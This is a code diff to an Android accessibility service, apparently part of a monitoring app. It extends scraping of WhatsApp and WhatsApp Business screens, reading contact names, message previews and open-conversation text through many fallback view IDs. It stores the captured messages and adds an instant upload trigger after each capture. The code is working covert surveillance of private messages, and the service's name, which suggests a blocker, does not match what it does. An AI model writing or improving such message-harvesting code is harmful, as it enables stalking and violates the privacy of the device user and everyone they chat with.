@@ -141,19 +141,47 @@ class BlockAccessibilityService : AccessibilityService() {
             val entriesToInsert = mutableListOf<WhatsAppMessageEntry>()
             val now = System.currentTimeMillis()
 
-            // 1. Check for main WhatsApp Chats list rows (captures the complete chatlist)
-            val rowContactNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversations_row_contact_name")
-                ?.takeIf { it.isNotEmpty() }
-                ?: root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/conversations_row_contact_name")
+            // 1. Check for WhatsApp Chats list rows across standard and business IDs
+            val rowIdCandidates = listOf(
+                "com.whatsapp:id/conversations_row_contact_name",
+                "com.whatsapp.w4b:id/conversations_row_contact_name",
+                "com.whatsapp:id/conversations_contact_name",
+                "com.whatsapp.w4b:id/conversations_contact_name",
+                "com.whatsapp:id/contact_name",
+                "com.whatsapp.w4b:id/contact_name",
+                "com.whatsapp:id/chat_title",
+                "com.whatsapp.w4b:id/chat_title"
+            )
+            var rowContactNodes: List<AccessibilityNodeInfo>? = null
+            for (id in rowIdCandidates) {
+                val nodes = root.findAccessibilityNodeInfosByViewId(id)
+                if (!nodes.isNullOrEmpty()) {
+                    rowContactNodes = nodes
+                    break
+                }
+            }
+
+            val msgIdCandidates = listOf(
+                "com.whatsapp:id/single_msg_tv",
+                "com.whatsapp.w4b:id/single_msg_tv",
+                "com.whatsapp:id/msg_tv",
+                "com.whatsapp.w4b:id/msg_tv",
+                "com.whatsapp:id/last_message",
+                "com.whatsapp.w4b:id/last_message"
+            )
+            var rowMsgNodes: List<AccessibilityNodeInfo>? = null
+            for (id in msgIdCandidates) {
+                val nodes = root.findAccessibilityNodeInfosByViewId(id)
+                if (!nodes.isNullOrEmpty()) {
+                    rowMsgNodes = nodes
+                    break
+                }
+            }
 
             if (!rowContactNodes.isNullOrEmpty()) {
-                val rowMsgNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/single_msg_tv")
-                    ?.takeIf { it.isNotEmpty() }
-                    ?: root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/single_msg_tv")
-
                 for (i in rowContactNodes.indices) {
                     val name = rowContactNodes[i].text?.toString()?.trim() ?: continue
-                    if (name.isBlank()) continue
+                    if (name.isBlank() || name == "Chats" || name == "Updates" || name == "Calls") continue
                     val preview = if (rowMsgNodes != null && i < rowMsgNodes.size) {
                         rowMsgNodes[i].text?.toString()?.trim()
                     } else null
@@ -175,27 +203,42 @@ class BlockAccessibilityService : AccessibilityService() {
 
             // 2. Check for active open conversation messages
             var chatTitle: String? = null
-            val titleNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name")
-                ?.takeIf { it.isNotEmpty() }
-                ?: root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/conversation_contact_name")
-            if (!titleNodes.isNullOrEmpty()) {
-                chatTitle = titleNodes[0].text?.toString()?.trim()
-            }
-            if (chatTitle.isNullOrBlank()) {
-                val abNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/action_bar_title")
-                    ?.takeIf { it.isNotEmpty() }
-                    ?: root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/action_bar_title")
-                if (!abNodes.isNullOrEmpty()) {
-                    chatTitle = abNodes[0].text?.toString()?.trim()
+            val titleIdCandidates = listOf(
+                "com.whatsapp:id/conversation_contact_name",
+                "com.whatsapp.w4b:id/conversation_contact_name",
+                "com.whatsapp:id/action_bar_title",
+                "com.whatsapp.w4b:id/action_bar_title",
+                "com.whatsapp:id/contact_title",
+                "com.whatsapp.w4b:id/contact_title"
+            )
+            for (id in titleIdCandidates) {
+                val nodes = root.findAccessibilityNodeInfosByViewId(id)
+                if (!nodes.isNullOrEmpty()) {
+                    val candidate = nodes[0].text?.toString()?.trim()
+                    if (!candidate.isNullOrBlank() && candidate != "WhatsApp") {
+                        chatTitle = candidate
+                        break
+                    }
                 }
             }
 
             if (!chatTitle.isNullOrBlank()) {
                 val displayMetrics = resources.displayMetrics
                 val screenWidth = displayMetrics.widthPixels
-                val messageNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text")
-                    ?.takeIf { it.isNotEmpty() }
-                    ?: root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/message_text")
+                val msgIdList = listOf(
+                    "com.whatsapp:id/message_text",
+                    "com.whatsapp.w4b:id/message_text",
+                    "com.whatsapp:id/caption",
+                    "com.whatsapp.w4b:id/caption"
+                )
+                var messageNodes: List<AccessibilityNodeInfo>? = null
+                for (id in msgIdList) {
+                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
+                    if (!nodes.isNullOrEmpty()) {
+                        messageNodes = nodes
+                        break
+                    }
+                }
 
                 if (!messageNodes.isNullOrEmpty()) {
                     for (node in messageNodes) {
@@ -229,6 +272,7 @@ class BlockAccessibilityService : AccessibilityService() {
                     try {
                         val db = AppDatabase.getInstance(applicationContext)
                         db.whatsAppMessageDao().insertAll(entriesToInsert)
+                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                     } catch (e: Exception) {
                         Log.e("BlockA11y", "Failed to insert captured WhatsApp messages", e)
                     }
